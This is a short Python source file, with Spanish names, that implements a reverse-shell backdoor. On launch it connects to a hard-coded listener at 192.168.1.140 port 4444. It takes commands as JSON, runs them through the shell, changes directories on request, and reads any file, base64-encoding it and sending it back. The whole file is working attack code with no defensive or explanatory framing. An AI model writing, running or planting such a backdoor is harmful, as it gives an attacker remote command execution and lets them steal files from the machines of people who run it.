import socket
import subprocess
import json
import sys
import os
import base64

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send(" \n [+] Conexion establecida \n".encode())  
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())
     
    def recepcion_segura(self):
        json_data = ""
        
        while True:
            try:
                    
                json_data = self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True).decode("windows-1252")
    
    
    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {}".format(ruta)

    
    def leer_archivo(self,ruta):
        with open(ruta,"rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")

    
    def run(self):
        while True:
            comando = self.recepcion_segura()
            try:
                if comando[0] == "salir":
                    self.connection.close()
                    exit()
                elif comando[0] == "cd" and len(comando) > 1:
                    resultado_comando = self.cambiar_directorio(comando[1]) 
                elif comando[0] == "descargar":
                    resultado_comando = self.leer_archivo(comando[1])
                else:
                    resultado_comando = self.ejecutar_comando(comando)
            except Exception:
                resultado_comando = "Error de ejecucion"
                
            self.envio_seguro(resultado_comando)

backdoor = Backdoor("192.168.1.140",4444)
backdoor.run()
